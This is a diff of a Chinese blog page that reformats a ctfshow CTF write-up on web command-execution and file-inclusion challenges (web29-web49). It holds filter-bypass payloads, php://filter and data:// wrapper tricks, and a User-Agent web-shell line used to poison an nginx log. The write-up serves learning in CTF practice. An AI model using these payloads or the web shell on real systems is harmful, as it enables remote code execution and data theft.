@@ -351,66 +351,95 @@
     
     <div class="post-body" itemprop="articleBody"><p>学点web</p>
 <span id="more"></span>
-<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zmx2473162621/article/details/115284712">wp</a></p>
+<h1 id="信息收集">信息收集</h1>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zmx2473162621/article/details/115284712">wp</a></p>
 <p><a target="_blank" rel="noopener" href="https://wkr.moe/ctf/447.html#web15%5B%E7%A4%BE%E5%B7%A5%5D">wp2</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/a597934448/article/details/105431367">各种泄露</a></p>
-<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/109837640">y4的wp</a></p>
+<h1 id="命令执行">命令执行</h1>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/109837640">y4的wp</a></p>
 <p>一些基本提取文件的操作：cat、nl、tac、highlight_file()、vim、vi</p>
 <p>匹配：*多个字符匹配，?单个字符匹配</p>
-<p>转义符：^、””、’’</p>
-<p>执行函数echo()、system()、passthru() 、exec()、 shell_exec()、popen()、proc_open()、pcntl_exec()</p>
-<h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><p>只过滤了flag</p>
+<p>转义符：^、""、''</p>
+<p>执行函数echo()、system()、passthru() 、exec()、
+shell_exec()、popen()、proc_open()、pcntl_exec()</p>
+<h2 id="web29">web29</h2>
+<p>只过滤了flag</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">system</span>(<span class="string">&quot;nl fla*&quot;</span>);<span class="comment">//匹配</span></span><br><span class="line">c=<span class="keyword">echo</span> `nl fl<span class="string">&#x27;&#x27;</span>ag.php`;<span class="comment">//转义字符</span></span><br><span class="line">c=<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;nl flag.php&#x27;</span>);<span class="comment">//因为只过滤c的flag，所以用1传参不会被过滤</span></span><br></pre></td></tr></table></figure>
-<h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><p>过滤了flag、system、php</p>
+<h2 id="web30">web30</h2>
+<p>过滤了flag、system、php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">echo</span> <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;nl fla?????&#x27;</span>);</span><br></pre></td></tr></table></figure>
 <p>和上一问差不多</p>
-<h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><p>过滤了很多，”/flag|system|php|cat|sort|shell|.| |\’/i”（/i大小写不敏感）</p>
+<h2 id="web31">web31</h2>
+<p>过滤了很多，"/flag|system|php|cat|sort|shell|.|
+|'/i"（/i大小写不敏感）</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;nl flag.php&#x27;</span>);<span class="comment">//没过滤eval，用1传参</span></span><br><span class="line">c=<span class="keyword">echo</span>(`nl%<span class="number">09</span>fl[abc]*`);<span class="comment">//%09空格转义，[abc]匹配不包含abc的文字</span></span><br><span class="line">c=<span class="string">&quot;\x73\x79\x73\x74\x65\x6d&quot;</span>(<span class="string">&quot;nl%09fl[a]*&quot;</span>);<span class="comment">//等价于system()</span></span><br><span class="line">c=<span class="keyword">echo</span>`strings\<span class="variable">$IFS</span>\$<span class="number">9</span>f*`<span class="comment">//\$IFS\$9 win下空格转义</span></span><br></pre></td></tr></table></figure>
 <p>查文件路径的语法：</p>
 <p>首先<code>print_r(scandir(dirname(__FILE__)));</code>查看当前目录下文件</p>
-<p>然后找到flag.php<br><code>print_r(next(array_reverse(scandir(dirname(__FILE__)))));</code><br>之后高亮显示即可<br><code>c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));</code></p>
+<p>然后找到flag.php
+<code>print_r(next(array_reverse(scandir(dirname(__FILE__)))));</code>
+之后高亮显示即可
+<code>c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));</code></p>
 <p><code>c=show_source(next(array_reverse(scandir(pos(localeconv())))));</code>和上面的差不多</p>
-<h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><p>过滤的更多了：(“/flag|system|php|cat|sort|shell|.| |\’|`|echo|\;|(/i”</p>
+<h2 id="web32">web32</h2>
+<p>过滤的更多了：("/flag|system|php|cat|sort|shell|.|
+|'|`|echo|;|(/i"</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$nice</span>=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]<span class="meta">?&gt;</span>&amp;url=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php//这个$nice=暂且不知道是干啥的，去掉也能执行</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt; //伪协议，下一个也是</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span></span><br></pre></td></tr></table></figure>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wjrblogs/p/12285202.html">伪协议</a></p>
-<h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><p>比32多过滤了个双引号，所以要把“url”改成1：”/flag|system|php|cat|sort|shell|.| |\’|`|echo|\;|(|\”/i”</p>
+<h2 id="web33">web33</h2>
+<p>比32多过滤了个双引号，所以要把“url"改成1："/flag|system|php|cat|sort|shell|.|
+|'|`|echo|;|(|"/i"</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/palin,&lt;?php system(&quot;nl flag.php&quot;);?&gt;</span></span><br></pre></td></tr></table></figure>
-<h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><p>多了个’:’：”/flag|system|php|cat|sort|shell|.| |\’|`|echo|\;|(|\:|\”/i”</p>
+<h2 id="web34">web34</h2>
+<p>多了个':'："/flag|system|php|cat|sort|shell|.|
+|'|`|echo|;|(|:|"/i"</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/palin,&lt;?php system(&quot;nl flag.php&quot;);?&gt;</span></span><br></pre></td></tr></table></figure>
-<h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><p>多了小于和等于：”/flag|system|php|cat|sort|shell|.| |\’|`|echo|\;|(|\:|\”|\&lt;|\=/i”</p>
+<h2 id="web35">web35</h2>
+<p>多了小于和等于："/flag|system|php|cat|sort|shell|.|
+|'|`|echo|;|(|:|"|&lt;|=/i"</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/palin,&lt;?php system(&quot;nl flag.php&quot;);?&gt;</span></span><br></pre></td></tr></table></figure>
-<h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><p>多了数字：”/flag|system|php|cat|sort|shell|.| |\’|`|echo|\;|(|\:|\”|\&lt;|\=|\/|[0-9]/i”</p>
+<h2 id="web36">web36</h2>
+<p>多了数字："/flag|system|php|cat|sort|shell|.|
+|'|`|echo|;|(|:|"|&lt;|=|/|[0-9]/i"</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;a=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;a=data:<span class="comment">//text/palin,&lt;?php system(&quot;nl flag.php&quot;);?&gt;</span></span><br></pre></td></tr></table></figure>
-<h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><p>变成了文件包含</p>
+<h2 id="web37">web37</h2>
+<p>变成了文件包含</p>
 <p><img src="../images/web/image-20220718144945562.png" alt="image-20220718144945562"></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span></span><br><span class="line">c=data:<span class="comment">//text/palin,&lt;?php system(&quot;nl fla*&quot;);?&gt;</span></span><br><span class="line"><span class="comment">//还可以配合UA头执行日志包含</span></span><br><span class="line">c=/<span class="keyword">var</span>/log/nginx/access.log</span><br></pre></td></tr></table></figure>
 <p>UA头写马执行日志操作：</p>
-<ol>
-<li><p>先用c=/var/log/nginx/access.log发现能看日志<img src="../images/web/image-20220718161423024.png" alt="image-20220718161423024"></p>
-</li>
+<ol type="1">
+<li><p>先用c=/var/log/nginx/access.log发现能看日志<img src="../images/web/image-20220718161423024.png" alt="image-20220718161423024"></p></li>
 <li><p>User-Agent头写马：</p>
 <p><img src="../images/web/image-20220718161940874.png" alt="image-20220718161940874"></p>
-<p>User-Agent: &lt;?php eval($_POST[1]);?&gt;</p>
-</li>
-<li><p>再看日志<img src="../images/web/image-20220718162107763.png" alt="image-20220718162107763"></p>
-</li>
+<p>User-Agent: <?php eval($_POST[1]);?></p></li>
+<li><p>再看日志<img src="../images/web/image-20220718162107763.png" alt="image-20220718162107763"></p></li>
 <li><p>然后就可以命令执行了：</p>
-<p><img src="../images/web/image-20220718162135410.png" alt="image-20220718162135410"></p>
-</li>
-<li><p>1=system(“nl flag.php”);</p>
-<p><img src="../images/web/image-20220718162225485.png" alt="image-20220718162225485"></p>
-</li>
+<p><img src="../images/web/image-20220718162135410.png" alt="image-20220718162135410"></p></li>
+<li><p>1=system("nl flag.php");</p>
+<p><img src="../images/web/image-20220718162225485.png" alt="image-20220718162225485"></p></li>
 </ol>
-<h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><p>“/flag|php|file/i”</p>
+<h2 id="web38">web38</h2>
+<p>"/flag|php|file/i"</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span></span><br><span class="line">c=data:<span class="comment">//text/palin,&lt;?php system(&quot;nl fla*&quot;);?&gt;</span></span><br><span class="line"><span class="comment">//还可以配合UA头执行日志包含</span></span><br><span class="line">c=/<span class="keyword">var</span>/log/nginx/access.log</span><br></pre></td></tr></table></figure>
 <p>和上一题差不多</p>
-<h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><p><img src="../images/web/image-20220718165432040.png" alt="image-20220718165432040"></p>
+<h2 id="web39">web39</h2>
+<p><img src="../images/web/image-20220718165432040.png" alt="image-20220718165432040"></p>
 <p>用<code>c=data://text/plain,&lt;?=phpinfo();?&gt;</code>测试后缀有无影响，发现无：</p>
 <p><img src="../images/web/image-20220718170657074.png" alt="image-20220718170657074"></p>
-<p> .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么作用。data协议后有个?&gt;,已经闭合前面的php代码，所以后面的php拼接，不会影响php代码的执行</p>
+<p>.php
+因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么作用。data协议后有个?&gt;,已经闭合前面的php代码，所以后面的php拼接，不会影响php代码的执行</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=data:<span class="comment">//text/palin,&lt;?php system(&quot;nl fla*&quot;);?&gt;</span></span><br></pre></td></tr></table></figure>
-<h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><p>“/[0-9]|~|`|\@|#|\$|\%|\^|\&amp;|*|\（|\）|-|\=|+|{|[|]|}|\:|\’|\”|\,|\&lt;|.|>|\/|\?|\\/i”</p>
-<h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h2><h2 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h2><h2 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h2><h2 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h2><h2 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h2>
+<h2 id="web40">web40</h2>
+<p>"/[0-9]|~|`|@|#|\$|%|^|&amp;|*|（|）|-|=|+|{|[|]|}|:|'|"|,|&lt;|.|&gt;|/|?|\\/i"</p>
+<h2 id="web41">web41</h2>
+<h2 id="web42">web42</h2>
+<h2 id="web43">web43</h2>
+<h2 id="web44">web44</h2>
+<h2 id="web45">web45</h2>
+<h2 id="web46">web46</h2>
+<h2 id="web47">web47</h2>
+<h2 id="web48">web48</h2>
+<h2 id="web49">web49</h2>
+
     </div>
 
     
@@ -483,14 +512,14 @@
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">50k</span>
+    <span title="站点总字数">67k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">45 分钟</span>
+    <span title="站点阅读时长">1:01</span>
   </span>
 </div>
 <div class="busuanzi-count">
@@ -544,7 +573,7 @@
 
   
 
-  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"all","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
 <script src="/js/third-party/math/mathjax.js"></script>
 
 
